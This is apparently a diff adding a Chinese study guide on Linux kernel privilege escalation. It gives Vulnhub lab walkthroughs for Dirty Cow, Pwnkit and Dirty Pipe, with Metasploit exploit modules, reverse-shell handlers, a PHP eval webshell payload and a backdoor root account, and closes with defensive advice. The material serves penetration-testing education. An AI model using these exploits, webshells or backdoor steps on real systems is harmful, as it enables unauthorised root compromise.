@@ -1,0 +1,272 @@
+## 1. 概述
+
+在渗透测试和网络攻防中，获取目标系统的初始访问权限（如 www-data 用户）只是第一步。为了完全控制系统、访问敏感数据或进行持久化控制，攻击者需要将当前低权限用户提升至 root 用户。Linux 权限提升（Privilege Escalation）的手段多种多样，包括利用 SUID/SGID 程序、滥用 sudo 配置、利用计划任务（Cron Jobs）以及本文档将重点探讨的——**利用内核漏洞进行提权**。
+
+内核是操作系统的核心，负责管理系统资源。当内核本身存在安全漏洞时，攻击者可以构造特定的恶意代码来触发这些漏洞，从而绕过系统的安全限制，直接获取最高权限（root）。本文档将系统性地介绍内核提权的基本流程，从信息收集、漏洞筛选到利用常见内核漏洞（如 Dirty Cow, Pwnkit, Dirty Pipe）进行实战演练。
+
+本文档旨在为安全研究人员和爱好者提供一份结构清晰、内容详实的学习笔记和实战手册。
+
+## 2. 技术原理
+
+Linux 内核提权的本质是利用内核代码中存在的缺陷（如整数溢出、条件竞争、内存越界访问等），来执行以下一种或多种恶意操作：
+
+*   **修改进程凭证**：直接修改当前进程的 `cred` 结构体，将其 UID（用户 ID）和 GID（组 ID）从普通用户更改为 0 (root)。
+*   **注入 Shellcode**：在内核空间执行一段预先准备好的、用于创建 root shell 的机器码。
+*   **覆盖关键文件**：利用漏洞向受保护的文件（如 `/etc/passwd` 或 `/etc/sudoers`）写入内容，从而创建后门用户或赋予当前用户免密 `sudo` 权限。
+
+内核漏洞通常由 CVE（Common Vulnerabilities and Exposures）编号进行唯一标识。攻击者在获取目标系统的内核版本后，会查询该版本是否存在已公开的、有可用利用代码（Exploit）的 CVE 漏洞，从而实施精准打击。
+
+## 3. 环境准备
+
+在进行内核提权之前，首要任务是进行全面的信息收集，以确定目标系统的具体情况。
+
+### 3.1 信息收集
+
+#### 3.1.1 操作系统与发行版信息
+
+确定操作系统的发行版和版本，有助于缩小漏洞搜索范围。
+
+```bash
+# 通用性较高的命令
+hostnamectl
+cat /etc/os-release
+cat /etc/issue
+lsb_release -a
+
+# 特定发行版的命令
+cat /etc/redhat-release  # Red Hat/CentOS
+cat /etc/centos-release  # CentOS
+cat /etc/lsb-release     # Debian/Ubuntu
+```
+
+#### 3.1.2 内核版本信息
+
+内核版本是进行漏洞匹配的关键。
+
+```bash
+# 查看内核版本
+uname -a
+hostnamectl
+cat /proc/version
+dmesg | grep "Linux version"
+```
+
+### 3.2 漏洞筛选与利用脚本
+
+手动查找内核漏洞效率低下。在实战中，我们通常使用自动化脚本来扫描系统，并根据当前内核版本建议可能成功的漏洞利用程序。
+
+#### 3.2.1 专用内核漏洞扫描脚本
+
+这些脚本专注于内核漏洞的检测。
+
+*   **Traitor**: [https://github.com/liamg/traitor](https://github.com/liamg/traitor)
+*   **Linux Exploit Suggester**: [https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
+*   **Linux Exploit Suggester 2**: [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
+
+#### 3.2.2 综合信息枚举脚本
+
+这些脚本功能更全面，除了内核漏洞，还会检查 SUID 文件、sudo 配置、计划任务等其他提权向量。
+
+*   **PEASS-ng**: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
+*   **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
+*   **Linux Smart Enumeration**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+
+## 4. 实战示例
+
+以下将通过三个经典的 Vulnhub 靶场环境，演示从获取 WebShell 到利用内核漏洞提权的完整流程。
+
+### 4.1 案例一：Dirty Cow (CVE-2016-5195)
+
+**Dirty Cow** 是一个经典的 Linux 内核写时复制（Copy-on-Write）机制的条件竞争漏洞，允许低权限用户修改只读内存映射。我们可以利用它来覆盖 `/etc/passwd` 文件，从而创建一个 root 权限的用户。
+
+*   **复现环境**: [Lampiao: 1 (Vulnhub)](https://www.vulnhub.com/entry/lampiao-1,249/)
+
+#### 4.1.1 攻击流程
+
+1.  **信息收集与 Web 漏洞利用**:
+    *   通过 `nmap` 扫描发现目标开放了 1898 端口，运行着一个 Drupal 网站。
+    *   利用 Metasploit 中的 `drupal_drupalgeddon2` 漏洞利用模块获取初始访问权限。
+
+    ```bash
+    # Metasploit 操作
+    msfconsole
+    use exploit/unix/webapp/drupal_drupalgeddon2
+    set RHOSTS 192.168.xx.xx
+    set RPORT 1898
+    run
+    ```
+
+2.  **内核漏洞扫描与提权**:
+    *   上传 `linux-exploit-suggester.sh` 脚本到目标服务器的 `/tmp` 目录。
+    *   执行脚本，发现系统可能受 `Dirty Cow (CVE-2016-5195)` 漏洞影响。
+
+    ```bash
+    # 在 meterpreter 会话中
+    upload /path/to/linux-exploit-suggester.sh /tmp/les.sh
+    shell
+    cd /tmp
+    chmod +x les.sh
+    ./les.sh
+    ```
+
+3.  **编译并执行 Exploit**:
+    *   下载 `Dirty Cow` 的 C++ 利用代码（例如来自 [gbonacini/CVE-2016-5195](https://github.com/gbonacini/CVE-2016-5195)）。
+    *   上传 `dcow.cpp` 到 `/tmp` 目录并编译。
+    *   执行编译后的程序，它会自动创建一个名为 `firefart` 的 root 权限用户，密码为 `dirtyCowFun`。
+
+    ```bash
+    # 在 meterpreter 会ah话中
+    upload /path/to/dcow.cpp /tmp/dcow.cpp
+
+    # 进入目标服务器的 shell
+    shell
+    cd /tmp
+    g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
+    ./dcow
+    ```
+
+4.  **切换用户获取 Root**:
+    *   执行成功后，使用 `su` 命令切换到新创建的 root 用户。
+
+    ```bash
+    su firefart
+    # 输入密码: dirtyCowFun
+    whoami
+    # 输出: root
+    ```
+
+### 4.2 案例二：Pwnkit (CVE-2021-4034)
+
+**Pwnkit** 是 Polkit 的 `pkexec` 组件中存在的一个本地权限提升漏洞。由于 `pkexec` 在处理命令行参数时存在内存越界写入，攻击者可以利用它来引入恶意环境变量，最终以 root 权限执行任意代码。
+
+*   **复现环境**: [DarkHole: 1 (Vulnhub)](https://www.vulnhub.com/entry/darkhole-1,724/)
+
+#### 4.2.1 攻击流程
+
+1.  **Web 漏洞利用**:
+    *   通过 Web 应用漏洞（如任意文件上传）获取一个反弹 shell。在此靶场中，通常涉及重置管理员密码后上传一个 PHP WebShell。
+    *   使用 Metasploit 的 `exploit/multi/handler` 监听反弹连接。
+
+    ```bash
+    # Metasploit 监听
+    use exploit/multi/handler
+    set payload php/meterpreter/reverse_tcp
+    set LHOST 0.0.0.0
+    set LPORT 6666
+    run
+    ```
+
+2.  **内核漏洞扫描**:
+    *   与上一个案例类似，上传并执行 `linux-exploit-suggester.sh`。
+    *   脚本输出会明确指出系统受 `CVE-2021-4034 (Pwnkit)` 影响。
+
+3.  **利用 Metasploit 模块提权**:
+    *   Metasploit 内置了 Pwnkit 的利用模块，这是最便捷的提权方式。
+    *   将当前 meterpreter 会话置于后台，搜索并使用 Pwnkit 模块。
+
+    ```bash
+    # 在 meterpreter 会话中
+    background
+    search cve_2021_4034
+    use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+    set session 1  # 设置为你的 meterpreter 会话 ID
+    run
+    ```
+
+4.  **验证权限**:
+    *   模块执行成功后，会返回一个新的 root 权限的 meterpreter 会话。
+
+    ```bash
+    getuid
+    # Server username: root
+    shell
+    cd /root
+    cat root.txt
+    ```
+
+### 4.3 案例三：Dirty Pipe (CVE-2022-0847)
+
+**Dirty Pipe** 是一个影响 Linux 内核 5.8 及之后版本的漏洞。它允许向任意只读文件（即使是不可变文件）写入数据，但存在一些限制（如写入不能跨越页面边界）。攻击者通常利用它来覆盖 SUID 程序、cron 脚本或密码文件以实现提权。
+
+*   **复现环境**: [Matrix-Breakout-2: Morpheus (Vulnhub)](https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/)
+
+#### 4.3.1 攻击流程
+
+1.  **Web 漏洞利用**:
+    *   通过目录扫描（如 `gobuster`）发现可疑的 Web 应用接口。
+    *   分析接口功能，发现一个任意文件写入漏洞，利用该漏洞写入一个 PHP WebShell。
+    *   获取反弹 shell 到 Metasploit。
+
+    ```bash
+    # 写入 WebShell
+    # POST /path/to/endpoint HTTP/1.1
+    # ...
+    # message=<?php eval($_POST["pass"]);?>&file=shell.php
+
+    # MSF 监听
+    use exploit/multi/handler
+    set payload php/meterpreter/reverse_tcp
+    set LHOST 0.0.0.0
+    set LPORT 6666
+    run
+    ```
+
+2.  **漏洞扫描与提权**:
+    *   上传并运行漏洞扫描脚本，确认存在 `CVE-2022-0847 (Dirty Pipe)` 漏洞。
+    *   Metasploit 同样集成了此漏洞的利用模块。
+
+    ```bash
+    # 在 meterpreter 会话中
+    background
+    search cve_2022_0847
+    use exploit/linux/local/cve_2022_0847_dirtypipe
+    set session 1
+    set LHOST <your_ip> # 设置反弹新 shell 的 IP
+    run
+    ```
+
+3.  **获取 Root Shell**:
+    *   模块执行成功后，会创建一个新的 root 会话，完成提权。
+
+## 5. 关键细节与补充
+
+*   **编译环境**: 在很多最小化的 Docker 容器或服务器环境中，可能没有安装 `gcc` 或 `g++` 编译器。在这种情况下，你需要：
+    1.  在本地与目标系统架构相同的环境中（如 Kali Linux）交叉编译好漏洞利用程序。
+    2.  将编译好的二进制可执行文件直接上传到目标服务器运行。
+
+*   **交互式 Shell**: 通过 WebShell 获取的初始会话通常是非交互式的，这会导致 `su` 等命令无法正常工作。你需要使用以下命令来获取一个伪终端（PTY）：
+    ```python
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    # 或
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    # 或
+    script /dev/null -c /bin/bash
+    ```
+
+*   **漏洞的适用性**: 并非所有漏洞都适用于所有场景。例如，Dirty Pipe 要求内核版本 >= 5.8，而 Dirty Cow 则适用于较旧的内核。因此，准确的信息收集是成功提权的前提。
+
+*   **其他重要内核漏洞**: 除了上述三个案例，还有许多其他高影响力的内核提权漏洞值得关注：
+    *   **SUDO Baron Samedit (CVE-2021-3156)**: Sudo 堆溢出漏洞。
+    *   **CVE-2022-0995**: watch_queue 内核模块整数溢出。
+    *   **CVE-2023-0386**: OverlayFS 模块中未正确处理文件权限的漏洞。
+    *   **CVE-2017-16995**: eBPF 验证器中的一个漏洞。
+
+## 6. 安全总结与防御建议
+
+内核漏洞提权是 Linux 系统面临的最严重威胁之一。从防御者的角度来看，可以采取以下措施来缓解风险：
+
+1.  **及时更新内核**: 这是最根本、最有效的防御措施。Linux 发行版厂商会持续发布包含安全补丁的内核更新。定期执行 `sudo apt update && sudo apt upgrade` (Debian/Ubuntu) 或 `sudo yum update` (CentOS/RHEL) 至关重要。
+
+2.  **最小化安装**: 仅安装必要的软件包和服务，减少系统的攻击面。一个没有 `pkexec` 的系统自然不会受到 Pwnkit 漏洞的影响。
+
+3.  **使用安全加固技术**:
+    *   **AppArmor / SELinux**: 启用并配置强制访问控制（MAC）系统，可以限制即使被攻破的进程也无法执行越权操作。
+    *   **Grsecurity/PaX**: 提供更深层次的内核安全加固，包括对内存破坏漏洞的缓解措施。
+
+4.  **监控与告警**: 部署主机入侵检测系统（HIDS），监控异常的系统调用、文件修改（如 `/etc/passwd`）和进程行为，及时发现提权尝试。
+
+5.  **限制编译器**: 在生产服务器上移除 `gcc` 等编译器，增加攻击者在服务器上直接编译漏洞利用代码的难度。
+
+通过结合及时的补丁管理、系统加固和持续监控，可以显著提高防御内核漏洞利用的门槛。
+
+---
